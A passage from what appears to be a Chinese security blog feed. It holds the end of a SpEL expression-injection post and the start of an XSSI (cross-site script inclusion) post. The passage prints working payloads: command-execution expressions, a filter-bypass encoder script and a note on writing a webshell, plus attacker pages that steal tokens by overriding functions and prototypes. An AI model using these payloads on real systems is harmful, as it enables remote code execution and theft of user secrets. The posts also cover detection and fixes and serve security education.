不加最后的getInputStream()也行，因为弹计算器不需要回显</span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(java.net.URLDecoder).decode(&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;)),)</span><br><span class="line"></span><br><span class="line">// 黑名单过滤&quot;.getClass(&quot;，可利用数组的方式绕过，还未测试成功</span><br><span class="line">&apos;&apos;[&apos;class&apos;].forName(&apos;java.lang.Runtime&apos;).getDeclaredMethods()[15].invoke(&apos;&apos;[&apos;class&apos;].forName(&apos;java.lang.Runtime&apos;).getDeclaredMethods()[7].invoke(null),&apos;calc&apos;)</span><br><span class="line"></span><br><span class="line">// JDK9新增的shell，还未测试</span><br><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,&#123;&#125;).eval(&apos;whatever java code in one statement&apos;).toString()</span><br></pre></td></tr></table></figure><p>CreateAscii.py，用于String类动态生成字符的字符ASCII码转换生成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">message = input(<span class="string">'Enter message to encode:'</span>)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'Decoded string (in ASCII):\n'</span>)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'T(java.lang.Character).toString(%s)'</span> % ord(message[<span class="number">0</span>]), end=<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   print(<span class="string">'.concat(T(java.lang.Character).toString(%s))'</span> % ord(ch), end=<span class="string">""</span>), </span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'new java.lang.String(new byte[]&#123;'</span>, end=<span class="string">""</span>),</span><br><span class="line">print(ord(message[<span class="number">0</span>]), end=<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   print(<span class="string">',%s'</span> % ord(ch), end=<span class="string">""</span>), </span><br><span class="line">print(<span class="string">')&#125;'</span>)</span><br></pre></td></tr></table></figure><p>其他的一些payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 转自：https://www.jianshu.com/p/ce4ac733a4b9</span><br><span class="line"></span><br><span class="line">$&#123;pageContext&#125; 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;   获取web路径</span><br><span class="line"></span><br><span class="line">$&#123;header&#125;  文件头参数</span><br><span class="line"></span><br><span class="line">$&#123;applicationScope&#125; 获取webRoot</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())&#125;  执行命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。</span><br><span class="line"></span><br><span class="line">&lt;p th:text=&quot;$&#123;#this.getClass().forName(&apos;java.lang.System&apos;).getProperty(&apos;user.dir&apos;)&#125;&quot;&gt;&lt;/p&gt;   //获取web路径</span><br></pre></td></tr></table></figure><h2 id="0x03-检测与防御"><a href="#0x03-检测与防御" class="headerlink" title="0x03 检测与防御"></a>0x03 检测与防御</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>全局搜索关键特征：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//关键类</span></span><br><span class="line">org.springframework.expression.Expression</span><br><span class="line">org.springframework.expression.ExpressionParser</span><br><span class="line">org.springframework.expression.spel.standard.SpelExpressionParser</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用特征</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(str);</span><br><span class="line">expression.getValue()</span><br><span class="line">expression.setValue()</span><br></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>最直接的修复方法是使用SimpleEvaluationContext替换StandardEvaluationContext。</p><p>官方文档：<a href="https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html" target="_blank" rel="noopener">https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html</a></p><p>Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String spel = <span class="string">"T(java.lang.Runtime).getRuntime().exec(\"calc\")"</span>;</span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Student student = <span class="keyword">new</span> Student();</span><br><span class="line">EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(student).build();</span><br><span class="line">Expression expression = parser.parseExpression(spel);</span><br><span class="line">System.out.println(expression.getValue(context));</span><br></pre></td></tr></table></figure><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">由浅入深SpEL表达式注入漏洞</a></p><p><a href="https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html" target="_blank" rel="noopener">SpEL表达式</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析XSSI漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/01/04/%E6%B5%85%E6%9E%90XSSI%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/01/04/浅析XSSI漏洞/</id>
    <published>2020-01-04T02:24:56.000Z</published>
    <updated>2020-01-07T16:16:31.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>XSSI漏洞是个老东西了，最近看了下有点新东西，就记下笔记。</p><p>为了有效防御XSS，业界推出了CSP即内容安全策略，即使用白名单机制，对网站加载或执行的资源进行安全策略的控制。这种情形下，除非CSP配置存在问题，不然XSS一般是难以再被深入挖掘利用了。</p><p>但在某些场景中，开发者看你们会将敏感信息存放在某些文件中，当无法对XSS进行利用时，此时就可以尝试挖掘下是否存在XSSI漏洞。</p><h2 id="0x01-XSSI原理"><a href="#0x01-XSSI原理" class="headerlink" title="0x01 XSSI原理"></a>0x01 XSSI原理</h2><p>XSSI（全称Cross Site Script Inclusion）跨站脚本包含，是一种通过嵌入script标签的src属性来加载外部数据来实现绕过边界窃取敏感信息的漏洞。</p><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- attacker's page loads external data with SCRIPT tag --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">src</span>=<span class="string">"http://target.wooyun.org/secret"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XSSI的核心原理就是绕过SOP（同源策略）来跨域包含含有敏感信息的外域文件。我们知道，script标签是允许跨域加载资源的，如果某个网站的动态脚本、文件或响应中包含某些敏感信息（比如唯一标识符、个人资料、防御CSRF的Token），便有信息泄露的风险。XSSI就是利用的script标签允许跨域加载资源的特性来实现跨域包含资源的，这正是通过JSONP的技术来实现的。注意，大多数的XSSI都是针对动态JS文件进行攻击利用的。</p><blockquote><p>传统的XSSI攻击场景如下：恶意页面B使用script标签包含了目标网站A用来储存敏感数据的信息源C（可能是动态脚本、文件或响应），当攻击者引导受害者访问B时，由于受害者此时在A处于登录态，B可以轻松获取C中包含的受害者的敏感信息。 </p></blockquote><p>如图：</p><p><img src="/2020/01/04/浅析XSSI漏洞/22.png" alt=""></p><h2 id="0x02-XSSI与XSS、CSRF的区别"><a href="#0x02-XSSI与XSS、CSRF的区别" class="headerlink" title="0x02 XSSI与XSS、CSRF的区别"></a>0x02 XSSI与XSS、CSRF的区别</h2><p>相同点：三者均为Web前端安全漏洞，即针对客户端攻击的漏洞。</p><p>不同点：</p><ul><li>XSS是在受害者页面中注入恶意代码执行恶意操作，例如窃取已登录用户的cookie信息；</li><li>CSRF是通过诱使受害者访问恶意页面导致向目标页面发起请求，在受害者已登录的目标页面中执行恶意动作，例如提交修改用户密码的表单操作；</li><li>XSSI是通过script标签的src属性来跨域包含含有敏感数据的文件来窃取敏感信息的；</li></ul><h2 id="0x03-XSSI攻击利用"><a href="#0x03-XSSI攻击利用" class="headerlink" title="0x03 XSSI攻击利用"></a>0x03 XSSI攻击利用</h2><p>XSSI的攻击利用根据包含敏感信息的目标文件类型主要分两种场景，即JS文件和其他文件。这里JS文件的攻击利用最为简单直接，因为JS文件其内容本身就是JS代码，加载到script标签中刚好符合JS格式语法；而其他类型的文件的利用相比之下较为复杂。</p><p>我们可以对XSSI的攻击利用进行个简单的分类：</p><ul><li>针对JavaScript类型文件<ul><li>静态的JavaScript文件</li><li>静态的JavaScript文件，但仅在认证后可访问</li><li>动态的JavaScript文件</li></ul></li><li>针对非JavaScript类型文件<ul><li>CSV文件</li><li>JSON文件/响应</li></ul></li></ul><h3 id="针对JavaScript类型文件"><a href="#针对JavaScript类型文件" class="headerlink" title="针对JavaScript类型文件"></a>针对JavaScript类型文件</h3><p>在某些JS文件中，可能会保存着一些敏感信息。当然，静态和动态的JS文件它们之间的利用是存在区别的。</p><h4 id="窃取JS全局变量的值"><a href="#窃取JS全局变量的值" class="headerlink" title="窃取JS全局变量的值"></a>窃取JS全局变量的值</h4><p>这里假设目标服务端存在静态的secret.js文件，里面保存着token敏感信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token = <span class="string">"mi1k7ea_token_192ufh189u2erjsjoif189u"</span>;</span><br></pre></td></tr></table></figure><p>攻击者编写的xssi.html文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$(<span class="string">'#leaked_content'</span>).text(token);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>改文件即XSSI的攻击实现。通过script标签的src属性来跨域加载目标服务端的secret.js文件进来，然后将窃取到的token信息显示在页面上：</p><p><img src="/2020/01/04/浅析XSSI漏洞/1.png" alt=""></p><p>当然，这只是个模拟的简单的不行的演示。因为这个JS文件时静态的，直接访问都是可以的，此时利用XSSI进行攻击都是多此一举的。<strong>一般的，XSSI是针对动态的JS文件来攻击利用的</strong>，这是因为动态的JS文件通常在用户处于登录态时容易包含敏感信息。</p><blockquote><p>那么如何快速分辨一个JS文件是否为动态JS文件？——当有Cookie和无Cookie时请求所响应的文件内容不同时，即可确定这是一个动态JS文件了，当然并不是每一个动态JS文件都可以被利用。</p><p>我们可以使用Burpsuite的插件DetectDynamicJS来完成这项工作，此插件已在github上开源，链接地址：<a href="https://github.com/portswigger/detect-dynamic-js" target="_blank" rel="noopener">https://github.com/portswigger/detect-dynamic-js</a></p></blockquote><p>前面的敏感信息是保存在JS文件的全局变量中，获取的时候直接读取该全局变量的值即可，十分方便。下面看下敏感信息保存在JS文件的局部变量中如何来获取。</p><h4 id="重写函数窃取数据"><a href="#重写函数窃取数据" class="headerlink" title="重写函数窃取数据"></a>重写函数窃取数据</h4><p>一般情况下，网站都会将一些基本的功能函数写入一个JS文件中，以便后面的各项业务中能够很方便地重用这个功能函数。</p><h5 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h5><p>这里假设目标服务端含有敏感token信息的动态JS文件，getToken()函数中的session是动态获取的，此时敏感信息保存在局部变量中，并且调用doSomeThing()函数对该敏感信息进行处理：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> token = getToken();</span><br><span class="line">doSomeThing(token);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">len = <span class="number">16</span> || <span class="number">32</span>;</span><br><span class="line"><span class="keyword">var</span> $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'</span>;</span><br><span class="line"><span class="keyword">var</span> maxPos = $chars.length;</span><br><span class="line"><span class="keyword">var</span> pwd = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">pwd += $chars.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * maxPos));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XSSI利用页面，此时没法像前面那样直接通过全局变量就获取到敏感数据，因为这里敏感数据是保存在局部变量中的，并且调用了doSomeThing()方法对该变量进行处理，因此这里通过重写doSomeThing()函数来窃取token数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">doSomeThing</span><span class="params">(d)</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = d;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$(<span class="string">'#leaked_content'</span>).text(<span class="built_in">window</span>.data);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时就能成功窃取到敏感信息token了，这是因为将目标服务端的JS文件加载进来后，在调用doSomeThing()函数处理敏感数据时，是直接调用的恶意页面上实现的doSomeThing()函数，从而执行了攻击者自己编写的doSomeThing()函数的代码被窃取到了数据：</p><p><img src="/2020/01/04/浅析XSSI漏洞/2.png" alt=""></p><h5 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h5><p>secret.js，这次传递给函数的数据是一个包含了我们想要的数据的回调函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> email = <span class="string">"123@123.com"</span>;</span><br><span class="line">&#125;</span><br><span class="line">doSomeThing(callback);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>xssi.html，攻击者可以通过使用toString方法来获得回调函数中的这些数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">doSomeThing</span><span class="params">(callback)</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = callback.toString();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$(<span class="string">'#leaked_content'</span>).text(<span class="built_in">window</span>.data);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里就能获取到包括敏感信息在内的整个回调函数的内容：</p><p><img src="/2020/01/04/浅析XSSI漏洞/23.png" alt=""></p><p>如果想精准输出内容，可用正则：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">doSomeThing</span><span class="params">(callback)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> content = callback.toString();</span></span><br><span class="line"><span class="actionscript">window.data = /<span class="keyword">var</span>.*<span class="string">"(.*)"</span>/g.exec(content)[<span class="number">1</span>];</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="重写原型链窃取数据"><a href="#重写原型链窃取数据" class="headerlink" title="重写原型链窃取数据"></a>重写原型链窃取数据</h4><p>如果目标JS文件中并未调用相应的函数对敏感数据进行处理，换句话说，就是我们没办法重写函数来窃取敏感数据，此时我们可以考虑通过重写原型链来实现。这种方式的关键点在于，JS中调用了敏感数据所属类型的内置方法，比如String类型的内置方法split()/trim()/search()…等。</p><h5 id="Demo1-1"><a href="#Demo1-1" class="headerlink" title="Demo1"></a>Demo1</h5><p>这里假设目标服务端含有敏感token信息的动态JS文件，getToken()函数中的session是动态获取的，此时敏感信息保存在局部变量中，和前一小节的区别在于，并未调用函数对敏感数据进行处理，而是调用了String类型的内置方法trim()来处理该敏感数据：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> token = getToken();</span><br><span class="line"><span class="keyword">var</span> t = token.trim();</span><br><span class="line">&#125;</span><br><span class="line">setInfo();</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">len = <span class="number">16</span> || <span class="number">32</span>;</span><br><span class="line"><span class="keyword">var</span> $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'</span>;</span><br><span class="line"><span class="keyword">var</span> maxPos = $chars.length;</span><br><span class="line"><span class="keyword">var</span> pwd = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">pwd += $chars.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * maxPos));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XSSI利用页面，重写String类型的内置方法trim()的原型链来实现窃取敏感数据，这是由于token是String类型的，在调用trim()方法时会调用String原型链中的trim()方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 